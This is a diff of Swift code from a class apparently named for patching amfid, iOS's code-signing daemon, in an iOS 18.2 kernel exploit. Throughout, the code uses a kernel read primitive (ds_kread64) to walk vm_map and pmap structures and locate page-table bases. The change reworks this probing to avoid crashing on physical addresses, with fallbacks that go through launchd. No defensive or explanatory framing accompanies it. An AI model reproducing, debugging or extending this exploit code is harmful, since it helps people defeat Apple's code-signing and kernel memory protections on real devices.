@@ -219,40 +219,43 @@ final class ExpAmfidNopFinal {
         log("  pmap40: 0x\(String(format:"%llx", pmap40))")
         log("  pmap48 (raw): 0x\(String(format:"%llx", pmap48))")
         
-        // On iOS 18.2 A12: vm_map+0x40 = pmap (kernel VA)
-        //                   vm_map+0x48 = ttep (PHYSICAL address, page-aligned!)
-        // The ttep is stored directly in vm_map, not inside pmap struct
-        let rawTtep = ds_kread64(vmMap + 0x48)
-        let ttepIsPhysical = rawTtep != 0 && rawTtep > 0x100000000 && rawTtep < 0x10000000000 && (rawTtep & 0xFFF) == 0
-        log("  vm_map+0x48 as ttep: 0x\(String(format:"%llx", rawTtep)) (phys=\(ttepIsPhysical))")
+        // On iOS 18.2: vm_map+0x40 = pmap (kernel VA)
+        //              vm_map+0x48 = physical ttep (NOT readable via ds_kread64!)
+        // ds_kread64 only works on KERNEL VIRTUAL addresses.
+        // Physical addresses cause crash. We need ttep as kernel VA.
+        //
+        // The pmap struct should contain the ttep as a kernel VA somewhere.
+        // Try pmap+0x8, pmap+0x10, etc. — but ONLY read from kernel VAs.
+        // DO NOT read from physical addresses (0x6bab638000 etc.)
         
-        // Use vm_map+0x48 as ttep if it looks physical
-        var probeFoundTtep: UInt64 = 0
-        if ttepIsPhysical {
-            // Verify by reading L1[4] from this physical address
-            let l1Test = ds_kread64(rawTtep + 4 * 8)
-            log("  L1[4] test: 0x\(String(format:"%llx", l1Test)) (valid=\((l1Test & 0x3) == 0x3))")
-            if (l1Test & 0x3) == 0x3 {
-                probeFoundTtep = rawTtep
-                log("  ✅ ttep confirmed at vm_map+0x48: 0x\(String(format:"%llx", rawTtep))")
-            }
+        guard pmap != 0 else {
+            log("❌ pmap not found")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
         }
+        log("  ✅ pmap: 0x\(String(format:"%llx", pmap))")
         
-        // If vm_map+0x48 didn't work, try pmap+0x8 (common alternative)
-        if probeFoundTtep == 0 && pmap != 0 {
-            let pmapTtep = ds_kread64(pmap + 0x8)
-            let isPhy2 = pmapTtep != 0 && pmapTtep > 0x100000000 && pmapTtep < 0x10000000000 && (pmapTtep & 0xFFF) == 0
-            if isPhy2 {
-                let l1Test2 = ds_kread64(pmapTtep + 4 * 8)
-                if (l1Test2 & 0x3) == 0x3 {
-                    probeFoundTtep = pmapTtep
-                    log("  ✅ ttep at pmap+0x8: 0x\(String(format:"%llx", pmapTtep))")
+        // Read first few qwords from pmap (all kernel VAs, safe to read)
+        var probeFoundTtep: UInt64 = 0
+        log("  Pmap contents (looking for ttep as kernel VA):")
+        for off: UInt64 in [0x0, 0x8, 0x10, 0x18, 0x20] {
+            let val = ds_kread64(pmap + off)
+            let isKVA = (val >> 32) > 0xFFFFFF00
+            // Only test L1[4] if it's a kernel VA (safe to dereference)
+            if isKVA {
+                let l1 = ds_kread64(val + 4 * 8)
+                let l1Valid = (l1 & 0x3) == 0x3
+                log("    pmap+0x\(String(format:"%02x", off)) = 0x\(String(format:"%llx", val)) → L1[4]=0x\(String(format:"%llx", l1)) \(l1Valid ? "✅" : "")")
+                if l1Valid && probeFoundTtep == 0 {
+                    probeFoundTtep = val
                 }
+            } else if val != 0 {
+                log("    pmap+0x\(String(format:"%02x", off)) = 0x\(String(format:"%llx", val)) (not KVA, skip)")
             }
         }
         
         if probeFoundTtep == 0 {
-            log("  ❌ ttep not found")
+            log("  ❌ ttep not found in pmap (no kernel VA with valid L1[4])")
         }
         
         // Find text base — scan vm_map for userspace address
@@ -600,35 +603,21 @@ final class ExpAmfidNopFinal {
         }
         log("  pmap: 0x\(String(format:"%llx", pmap))")
         
-        // Read ttep — try vm_map+0x48 first (physical ttep on iOS 18.2)
-        // then pmap+0x8 as fallback
+        // Read ttep from pmap — ONLY try kernel VAs (physical addrs crash!)
         var ttep: UInt64 = 0
-        log("  Scanning for ttep...")
-        
-        let rawTtep48 = ds_kread64(vmMap + 0x48)
-        let is48Phys = rawTtep48 != 0 && rawTtep48 > 0x100000000 && rawTtep48 < 0x10000000000 && (rawTtep48 & 0xFFF) == 0
-        if is48Phys {
-            let l1Test = ds_kread64(rawTtep48 + 4 * 8)
+        for off: UInt64 in [0x0, 0x8, 0x10, 0x18, 0x20] {
+            let val = ds_kread64(pmap + off)
+            if val == 0 || (val >> 32) <= 0xFFFFFF00 { continue }
+            // It's a kernel VA — safe to dereference. Check L1[4]
+            let l1Test = ds_kread64(val + 4 * 8)
             if (l1Test & 0x3) == 0x3 {
-                ttep = rawTtep48
-                log("  ✅ ttep at vm_map+0x48: 0x\(String(format:"%llx", ttep))")
-            }
-        }
-        
-        if ttep == 0 {
-            let pmapTtep = ds_kread64(pmap + 0x8)
-            let isPhy2 = pmapTtep != 0 && pmapTtep > 0x100000000 && pmapTtep < 0x10000000000 && (pmapTtep & 0xFFF) == 0
-            if isPhy2 {
-                let l1Test2 = ds_kread64(pmapTtep + 4 * 8)
-                if (l1Test2 & 0x3) == 0x3 {
-                    ttep = pmapTtep
-                    log("  ✅ ttep at pmap+0x8: 0x\(String(format:"%llx", ttep))")
-                }
+                ttep = val
+                break
             }
         }
         
         guard ttep != 0 else {
-            log("❌ ttep not found")
+            log("❌ ttep not found in pmap")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
